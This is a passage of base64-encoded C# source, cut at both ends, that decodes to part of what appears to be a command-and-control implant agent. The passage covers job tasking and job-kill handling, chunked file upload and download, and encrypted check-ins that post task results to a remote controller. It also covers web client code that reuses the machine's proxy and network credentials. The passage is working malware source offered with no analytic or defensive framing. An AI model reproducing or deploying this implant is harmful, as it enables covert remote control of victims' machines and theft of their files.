LmRvd25sb2FkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY29tbWFuZCA9PSAiam9icyIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9IE1vZHVsZXMuR2V0Sm9icyhKb2JMaXN0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJqb2JraWxsIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE1vZHVsZXMuS2lsbEpvYihKb2JMaXN0LCBJbnQzMi5QYXJzZShKb2IucGFyYW1ldGVycykpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiSm9iIHN1Y2Nlc3NmdWxseSByZW1vdmVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJDb3VsZCBub3QgcmVtb3ZlIGpvYiI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgSm9iTGlzdC5qb2JzLkFkZChKb2IpOw0KICAgICAgICAgICAgICAgICAgICArK0pvYkxpc3Quam9iX2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBVdGlscy5VcGxvYWRSZXNwb25zZSBHZXRVcGxvYWQoVXRpbHMuVXBsb2FkIFVwbG9hZCkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCArIFV0aWxzLlVwbG9hZC5Ub0pzb24oVXBsb2FkKSkpOw0KI2VsaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0KFV0aWxzLlVwbG9hZC5Ub0pzb24oVXBsb2FkKSk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gR2V0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZFJlc3BvbnNlIFVwbG9hZFJlc3BvbnNlID0gVXRpbHMuVXBsb2FkUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIFVwbG9hZFJlc3BvbnNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IG5ldyBVdGlscy5VcGxvYWRSZXNwb25zZSB7IH07DQogICAgICAgICAgICAgICAgcmV0dXJuIFVwbG9hZFJlc3BvbnNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIFBvc3RSZXNwb25zZShVdGlscy5Kb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLlBvc3RSZXNwb25zZSBQb3N0UmVzcG9uc2UgPSBuZXcgVXRpbHMuUG9zdFJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAicG9zdF9yZXNwb25zZSIsDQogICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IHsgfQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIEpvYiBpbiBKb2JMaXN0LmpvYnMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNvbXBsZXRlZCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghSm9iLnN1Y2Nlc3MpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSAiZXJyb3IiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAiZmFsc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IEpvYi5yZXNwb25zZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmRvd25sb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBKb2IudG90YWxfY2h1bmtzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY2h1bmtfbnVtID09IEpvYi50b3RhbF9jaHVua3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gInRydWUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IEpvYi5jaHVua19udW0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gSm9iLmNodW5rc1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBKb2IuZmlsZV9pZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKChKb2IudG90YWxfY2h1bmtzICE9IDApICYmICghSm9iLnVwbG9hZCkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jaHVua19udW0gIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLmNodW5rc1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJmYWxzZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLmNodW5rc1swXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBKb2IucmVzcG9uc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIERhdGEgPSBVdGlscy5Qb3N0UmVzcG9uc2UuVG9Kc29uKFBvc3RSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgaWYgKERhdGEuQ29udGFpbnMoIltdIikpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlVVSUQgKyBVdGlscy5Qb3N0UmVzcG9uc2UuVG9Kc29uKFBvc3RSZXNwb25zZSkpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5Qb3N0UmVzcG9uc2UuVG9Kc29uKFBvc3RSZXNwb25zZSkpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgc3RyaW5nIHJlc3VsdCA9IFBvc3QoU2VyaWFsaXplZERhdGEpOw0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHJlc3VsdCkpOw0KI2VsaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBDcnlwdG8uRGVjcnlwdChyZXN1bHQpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgVXRpbHMuUG9zdFJlc3BvbnNlUmVzcG9uc2UgUG9zdFJlc3BvbnNlUmVzcG9uc2UgPSBVdGlscy5Qb3N0UmVzcG9uc2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQuU3Vic3RyaW5nKDM2KSk7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuUmVzcG9uc2UgUmVzcG9uc2UgaW4gUG9zdFJlc3BvbnNlUmVzcG9uc2UucmVzcG9uc2VzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIEpvYiBpbiBKb2JMaXN0LmpvYnMpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tcGxldGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IudGFza19pZCA9PSBSZXNwb25zZS50YXNrX2lkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZG93bmxvYWQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5maWxlX2lkID09IG51bGwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuZmlsZV9pZCA9IFJlc3BvbnNlLmZpbGVfaWQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IudG90YWxfY2h1bmtzID09IEpvYi5jaHVua19udW0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5SZW1vdmVKb2IoSm9iLCBKb2JMaXN0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jaHVua3MuQ291bnQgIT0gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLlJlbW92ZUF0KDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoKEpvYi50b3RhbF9jaHVua3MgIT0gMCkgJiYgKCFKb2IudXBsb2FkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSArIDEgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuUmVtb3ZlQXQoMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlJlbW92ZUpvYihKb2IsIEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KI2lmIChERUZBVUxUIHx8IERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXQoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW